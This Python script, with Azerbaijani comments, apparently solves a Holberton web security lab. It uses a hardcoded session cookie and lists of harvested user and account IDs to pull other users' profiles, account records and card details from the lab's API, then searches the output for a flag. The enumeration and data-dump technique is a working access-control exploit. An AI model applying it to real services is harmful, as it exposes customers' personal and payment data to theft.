import requests
import json

cookies = {
    "session": "vw5CZ4aypAxDEmWUSq7mZ2XOYWfUaSVvcCaOQlRhrdo.5eImUtd-10eJCycNoR4zyDVtIOQ"
}

# 1. Tapdığımız yeni istifadəçi ID-ləri
user_ids = [
    "c74fc9478a0a4674bd03d36a919b28a5", "8de2a1df9e7245dfb580ca06056e0cfc", 
    "eda7fcbbff144a7a8aab04eefd9c4311", "980ef77f82074fefb44d1fe1ea0599a0", 
    "6a6bb6e09be745b19d6559020522e2fc"
]

# 2. Həmin istifadəçilərə aid Hesab ID-ləri (kontaktlardan tapdığımız)
account_ids = [
    "ac6b2a3cbf5648959ad24401b3f6ce12", "a9d05c18d01f4f71abe8dd0a24583a4b", 
    "44ec481974954efb8a5b43ff58d0baf1", "6ab861adfd97427caece4a4179772f20", 
    "c6b57dfbe78e4ecf91b065b295f13813", "5da2a4373312420cbaa7a13baed57676", 
    "c4c67ed0d9b0429496f8d56f1da91a81", "5d51b09150c5411ba060e4c331f5f62e", 
    "2c80806be67646638e82c9c5bdb2c3b1", "e1479d43584c4ce1817d7c596ed54aa3"  
]

base_url = "http://web0x06.hbtn/api"
all_dumped_data = {}

print("Holberton tapşırığı üçün bütün datalar süzülür... Gözlə...\n")

# --- ADDIM 1: PROFİL MƏLUMATLARINI ÇƏK ---
print("[*] Profil məlumatları çəkilir...")
profiles = []
for uid in user_ids:
    resp = requests.get(f"{base_url}/customer/info/{uid}", cookies=cookies)
    if resp.status_code == 200:
        profiles.append(resp.json())
all_dumped_data["PROFILES"] = profiles

# --- ADDIM 2: HESAB MƏLUMATLARINI ÇƏK VƏ KART ID-LƏRİNİ TAP ---
print("[*] Hesab məlumatları və gizli Kart ID-ləri çəkilir...")
cards_ids = []
acc_resp = requests.post(f"{base_url}/accounts/info", json={"accounts_id": account_ids}, cookies=cookies)
if acc_resp.status_code == 200:
    acc_data = acc_resp.json().get("message", [])
    all_dumped_data["ACCOUNTS"] = acc_data
    for acc in acc_data:
        if "cards_id" in acc:
            cards_ids.extend(acc["cards_id"])

# --- ADDIM 3: KART MƏLUMATLARINI ÇƏK ---
if cards_ids:
    print(f"[*] {len(cards_ids)} ədəd kart tapıldı! Detalları çəkilir...")
    card_resp = requests.post(f"{base_url}/cards/info", json={"cards_id": cards_ids}, cookies=cookies)
    if card_resp.status_code == 200:
        all_dumped_data["CARDS"] = card_resp.json().get("message", [])

# BÜTÜN DATANI EKRANA YAZDIR
print("\n" + "="*50 + "\nBÜTÜN DATA DUMP EDİLDİ\n" + "="*50)
dump_json = json.dumps(all_dumped_data, indent=4, ensure_ascii=False)
print(dump_json)

# AVTOMATİK FLAG AXTARIŞI
print("\n" + "="*50)
if "flag" in dump_json.lower():
    print("🔥 TƏBRİKLƏR! Data içində 'flag' sözü tapıldı! Yuxarıdakı nəticəni diqqətlə oxu.")
else:
    print("Avtomatik axtarış 'flag' sözünü tapmadı. Çıxan JSON-a özün göz gəzdir, bəlkə fərqli adla gizlədilib.")
